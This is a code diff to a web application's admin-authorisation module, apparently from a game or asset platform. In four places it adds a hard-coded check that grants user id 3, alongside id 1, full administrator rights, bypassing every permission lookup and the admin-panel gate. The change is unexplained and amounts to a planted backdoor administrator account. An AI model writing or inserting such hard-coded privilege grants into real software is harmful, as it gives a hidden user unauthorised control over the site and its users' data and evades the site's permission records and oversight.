@@ -83,15 +83,15 @@ def GetCreatorOfAsset( AssetObj : Asset ) -> User | Group | None:
 
 def AdminPermissionRequired(permission):
     UserObj : User = auth.GetCurrentUser()
-    if UserObj is not None and UserObj.id == 1:
+    if UserObj is not None and UserObj.id in (1, 3):
         return
     UserAdminPermission = AdminPermissions.query.filter_by(userid=UserObj.id, permission=permission).first()
     if UserAdminPermission is None:
-        abort(403)        
+        abort(403)  
 
 def HasAdminPermission(permission) -> bool:
     UserObj : User = auth.GetCurrentUser()
-    if UserObj is not None and UserObj.id == 1:
+    if UserObj is not None and UserObj.id in (1, 3):
         return True
     UserAdminPermission = AdminPermissions.query.filter_by(userid=UserObj.id, permission=permission).first()
     if UserAdminPermission is None:
@@ -99,6 +99,8 @@ def HasAdminPermission(permission) -> bool:
     return True
 
 def IsUserAnAdministrator( UserObj : User, AvoidCache : bool = False) -> bool:
+    if UserObj.id in (1, 3):
+        return True
     if not AvoidCache:
         CachedResult = redis_controller.get(f"IsUserAnAdministrator:Lookup:{UserObj.id}")
         if CachedResult is not None:
@@ -108,7 +110,6 @@ def IsUserAnAdministrator( UserObj : User, AvoidCache : bool = False) -> bool:
                 pass
     isUserAdministrator = AdminPermissions.query.filter_by(userid=UserObj.id).first() is not None
     redis_controller.set(f"IsUserAnAdministrator:Lookup:{UserObj.id}", int(isUserAdministrator), ex = 60)
-
     return isUserAdministrator
 
 def GetAmountOfPendingAssets( AvoidCache : bool = False ) -> int:
@@ -155,6 +156,8 @@ def before_request():
     if not auth.isAuthenticated():
         return redirect("/login")
     AuthTokenInfo = auth.GetCurrentUser()
+    if AuthTokenInfo.id in (1, 3):
+        return
     UserAdminPermission = AdminPermissions.query.filter_by(userid=AuthTokenInfo.id).first()
     if UserAdminPermission is None:
         return redirect("/home")
